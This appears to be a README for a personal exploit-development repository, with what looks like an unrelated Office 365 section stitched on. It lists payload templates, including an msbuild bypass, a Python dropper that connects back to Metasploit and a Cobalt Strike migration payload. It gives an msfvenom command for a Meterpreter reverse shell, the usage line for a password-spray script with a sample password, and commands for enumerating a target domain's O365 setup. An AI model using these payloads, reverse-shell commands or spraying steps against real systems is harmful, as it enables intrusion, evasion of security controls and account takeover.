# ExploitDev/Shellcoding
Payload templating code for my own reference and research.

Reference:

1. msbuild-template.csproj
- The ever popular msbuild template developed by the king of bypasses (Casey Smith). 
- Usage: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f csharp
- This will hang, therefore, ensure migrate post module is set: set AutoRunScript post/windows/manage/migrate

2. template.c
- Generic c template for shellcode. 

3. template_small.py
- Simple python socket within a while loop. Can connect back to Metasploit's exploit handler
- The basis for the py2exe dropper

4. template.py
- Generic python template for creating a thread and loading shellcode

5. pemigrate.py
- This is the cobalt generated payload while using aggressor scripts to migrate to another process
- Used alongside threatexpress's automigrate.cna

Install the 64-bit version of the Microsoft Online Services Sign-in Assistant: https://go.microsoft.com/fwlink/p/?LinkId=286152
Install the Microsoft Azure Active Directory Module for Windows PowerShell with these steps:
- Open an elevated Windows PowerShell command prompt
- Run this command: Install-Module MSOnline
- If prompted to install the NuGet provider, type Y and press ENTER.
- If prompted to install the module from PSGallery, type Y and press ENTER.

Usage:
- \o365-spray.ps1 -Password Summer2018! -UserList .\userlist.txt

Basic Enumeration:
- host -t mx domain.com
- domain.com is handeled by 0 domain-com.mail.protection.outlook.com indicates o365 usage
- https://login.microsoftonline.com/getuserrealm.srf?login=user@domain.com&xml=1
- dig TXT domain.com and look if "v=spf1 include:spf.protection.outlook.com -all" which means if SPF is not good it will hardfail (-all)
